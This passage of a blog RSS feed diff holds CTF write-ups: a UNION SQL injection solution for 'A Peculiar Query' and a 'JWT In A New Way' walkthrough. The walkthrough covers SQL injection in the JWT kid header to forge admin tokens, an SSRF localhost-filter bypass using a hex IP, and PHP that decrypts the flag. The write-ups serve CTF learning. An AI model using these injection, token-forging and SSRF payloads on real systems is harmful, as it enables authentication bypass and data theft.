+&lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/blob/master/%C3%A5ngstromCTF2k20/A%20Peculiar%20Query/app.js&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt;&lt;/strong&gt; if you want to test :D&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/upRUoxR.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The next part is pretty classic , a simple sql injection , we will first dump the columns name (we know the table name from the source code)&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;q=%27union%20SELECT%20column_name%20FROM%20information_schema.columns%20&amp;ndash;%20-&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=%27&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/XAVrsrR.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;and finally we find a column named &lt;strong&gt;crime&lt;/strong&gt; so our final payload will be :&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;HOST/?q=%27union%20SELECT%20crime%20FROM%20criminals%20&amp;ndash;%20-&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=%27&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/7KWe6dF.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;And Congratulations ! I want to thank the organizers for this great CTF and fun tasks , i have really enjoyed participating&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>JWT In A New Way - NCSC 2.0 CTF</title>
+      <link>https://ahmed-belkahla.me/post/jwt-in-a-new-way/</link>
+      <pubDate>Wed, 22 Jan 2020 00:00:00 +0000</pubDate>
+      <guid>https://ahmed-belkahla.me/post/jwt-in-a-new-way/</guid>
+      <description>&lt;h1 id=&#34;jwt-in-a-new-way-1000pts-0-solves-&#34;&gt;&lt;strong&gt;JWT In a new way (1000pts) (0 Solves)&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/YuMeMZE.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;And finally i&amp;rsquo;m writing a writeup for this task xD i published this task in Securinets Mini CTF and NCSC2.0_CTF but unfortunately it had 0 solves (in fact no one managed to pass the first step) , it took me a lot of time to prepare this task so i hope you enjoy it :D
+However bring your coffee cup and let&amp;rsquo;s begin the road . This Task has 3 steps , the first one is bypassing JWT token with a custom attack (not the regular ones) actually using an SQL injection in one of the token parameters , then we will have to exploit an ssrf to crypt the content of flag file (too much filters here haha)&lt;/p&gt;
+&lt;h2 id=&#34;1st-step--jwt-bypass-&#34;&gt;1st Step : JWT Bypass&lt;/h2&gt;
+&lt;p&gt;After visiting the link we have a simple web page with a sign in and sign up page ;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/y8vDSCL.png&#34; alt=&#34;HOME&#34;&gt;&lt;/p&gt;
+&lt;p&gt;So after registering with random creds and signing in we check the cookies and as the task name refers we find a jwt token&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/mmFsMEd.png&#34; alt=&#34;HOME&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We go as usual to the famous jwt.io to see the content of the token&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/TRIhUBU.png&#34; alt=&#34;JWT&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We can try all the regular attacks but nothing will work , the kid value in the header is suspicious as we dont see it always in JWT tokens so after some googling we can conclude
+that the kid parameter is used when the jwt token is signed using multiple keys , each kid value refers to a different key (Example: kid:1 refers for ex to the key &amp;lsquo;blabla&amp;rsquo;
+and when we have kid:2 we are using a different key to sign the jwt token) Hmmm things are getting interesting here, we can suppose that the keys are fetched from a database maybe ,
+let&amp;rsquo;s read again the description , we can notice a hint for SQL so maybe we have an SQL injection ? Let&amp;rsquo;s try to trigger an error by injecting this in the kid parameter&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&#39; UNION SELECT 2 &amp;ndash; -&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;But Before you will have to fully understand how JWT tokens are forged, because there is no libraries that include the kid implementation so let&amp;rsquo;s take some notes here :&lt;/p&gt;
+&lt;p&gt;As we all know JWT token have 3 sections : Header + Payload + signature&lt;/p&gt;
+&lt;p&gt;Header : typically consists of two parts: the type of the token, which is JWT, and the signing algorithm being used, such as HMAC SHA256 or RSA but here we have also the kid part which is optional&lt;/p&gt;
+&lt;p&gt;Payload : it contains statements about an entity (typically, the user) and additional data .&lt;/p&gt;
+&lt;p&gt;Signature : Simply if we are using HS256 the sig is : Signature= HMACSHA256(BASE64URL(HEADER)+&amp;rsquo;.&amp;lsquo;+BASE64URL(PAYLOAD))&lt;/p&gt;
+&lt;p&gt;Be careful it&amp;rsquo;s BASE64URL not a regular BASE64 you can read about it here : 
+&lt;a href=&#34;https://fr.wikipedia.org/wiki/Base64#base64url&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;LINK&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;NOTE: you can use the php function hash_hmac(&amp;lsquo;sha256&amp;rsquo;, $msg, $key, true) to sign the token&lt;/p&gt;
+&lt;p&gt;so after forging the JWT token and replacing it we got this page !&lt;/p&gt;
+&lt;p&gt;Token i used (i have used a random key for the signature) :&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;eyJ0eXAiOiAiSldUIiwiYWxnIjogIkhTMjU2Iiwia2lkIjogIiAnIFVOSU9OIFNFTEVDVCAyIC0tIC0ifQ.eyJ1c2VyIjogImFhIiwidHlwZSI6ICJhZG1pbiJ9.xXh6UOMjm0YtgmiIsL6VExdDCLiUhIEF28kjv8UzWpo&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/GHbrcmm.png&#34; alt=&#34;JWT&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Hmmmmmmm an interesting message i think we are on a good path , now let&amp;rsquo;s think wisely , we have two paths now , the first one is to try to leak the keys with a blind SQL injection which is really painful especially if we face some filters and the second one which we will follow.&lt;/p&gt;
+&lt;p&gt;We will force the jwt token to use a key we provide to sign the token ; after some regular SQL injection tests we found that we had two columns which is expected (a column for the id and a column for the key ) we use this payload in the kid parameter&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&amp;lsquo;UNION SELECT 1,&amp;lsquo;kahla&amp;rsquo; &amp;ndash; -&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Thus the key will be forced to be kahla BUT we still get the annoying page &amp;ldquo;Here is your flag ! Just kidding &amp;quot; :&#39;( (What an evil author 3:) )&lt;/p&gt;
+&lt;p&gt;I think there are some filters here :&#39;( Let&amp;rsquo;s try this payload in the kid parameter :&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&amp;lsquo;UNiOn SElEcT 1,&amp;lsquo;abc&amp;rsquo; &amp;ndash; -&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The final token used:&lt;/p&gt;
+&lt;p&gt;eyJ0eXAiOiAiSldUIiwiYWxnIjogIkhTMjU2Iiwia2lkIjogIidVTmlPbiBTRWxFY1QgMSwnYWJjJyAtLSAtIn0.eyJ1c2VyIjogIiIsInR5cGUiOiAiYWRtaW4ifQ.3cOHXg1U7Mj_I3ag37oeg5KWJYA11T74bbD4NrcMC8A&lt;/p&gt;
+&lt;p&gt;And yeeeeeeees we did it ! but WTF where is our flag ! we need to finish this step before&lt;/p&gt;
+&lt;h2 id=&#34;2nd-step--ssrf--decrypt-&#34;&gt;2nd Step : SSRF + Decrypt&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/BLjbHaj.png&#34; alt=&#34;CRYPT&#34;&gt;&lt;/p&gt;
+&lt;p&gt;It&amp;rsquo;s a web application that crypts a txt file and after some tries i figured that it only accepts urls that finish with .txt extension&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/9mPssf6.png&#34; alt=&#34;CRYPT&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We can all notice that it&amp;rsquo;s an ssrf but:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;file protocol is filtered we only can use http or https protocol&lt;/li&gt;
+&lt;li&gt;localhost,127.0.0.1,127.0.1,the octal form of ip , and even ipv6 localhost address are filtered&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Finally i used this payload that bypassed all the filters below :&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;http://0x7f000001/flag.txt&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;I used the hexadecimal format of local ip address :D&lt;/p&gt;
+&lt;p&gt;And Bingo we have our flag but it&amp;rsquo;s encrypted
+&lt;img src=&#34;https://imgur.com/cFehJVI.png&#34; alt=&#34;CRYPT&#34;&gt;&lt;/p&gt;
+&lt;p&gt;If you check the source code you find a hint that leads us to visit robots.txt file and BINGO we find the crypting function&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;public static function cryptage($content){
+        $i=0;
+        $words=array(&#39;kAHl4&#39;,&#39;$ecUriNets&#39;,&#39;Cha1m4&#39;,&#39;th4meUr&#39;,&#39;WhiT3HacK3Rs&#39;,&#39;Ani$Bo$$CoUldNtS0Lv31t&#39;);
+        $crypted=&amp;quot;&amp;quot;;
+        for($i=0;$i&amp;lt;strlen($content);$i-=-pow(0,0))
+        {
+            $ser=serialize(array($words[$i % 6],&#39;securinets&#39;));
+            $key=intval(explode(&amp;quot;:&amp;quot;,explode(&amp;quot;;&amp;quot;,$ser)[1])[1]);
+            $crypted=$crypted.chr(ord($content[$i])+$key) ;          
+        }
+        return $crypted;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;But it&amp;rsquo;s somehow a little bit obfuscated , however after digging here is the decrypt function&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;function decryptage($content){
+        $i=0;
+        $words=array(&#39;kAHl4&#39;,&#39;$ecUriNets&#39;,&#39;Cha1m4&#39;,&#39;th4meUr&#39;,&#39;WhiT3HacK3Rs&#39;,&#39;Ani$Bo$$CoUldNtS0Lv31t&#39;);
+        $decrypted=&amp;quot;&amp;quot;;
+        for($i=0;$i&amp;lt;strlen($content);$i-=-pow(0,0))
+        {
+            $ser=serialize(array($words[$i % 6],&#39;securinets&#39;));
+            $key=intval(explode(&amp;quot;:&amp;quot;,explode(&amp;quot;;&amp;quot;,$ser)[1])[1]);
+            $decrypted=$decrypted.chr(ord($content[$i])-$key) ;
+        }
+        return $decrypted ;
+    }
+$cont=&amp;quot;eG9pfH5/c296eu+/vW01On1mP++/vTh4ZVt0SWRLe3tU77+9d2lJO1rvv71kXTZzYklkXk44MDcm77+9EA==&amp;quot; ;
+$con=base64_decode($cont);
+$res= decryptage($con);
+echo $res;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Executing this will give you the flag but with some unreadable characters (because of the non printable characters after crypting it) that&amp;rsquo;s why we can use curl in our cli and extract the crypted flag and save it or simply we can use a little python script
+that automates this and FINALLY we got The flag :&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;securinets{W00w_3v3n_Th3_AutHor_C4Nt_S0lV3_TH1$!!}&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;*** Conclusion ***&lt;/p&gt;
+&lt;p&gt;I hope you liked this task , it took me 4 continuous days of hard work to implement this idea ( i had to write a big part of jwt generator ) you can find the source code in the same directory ! Anyways dont forget to star me and if you faced any problems please contact me!&lt;/p&gt;
 </description>
     </item>
     
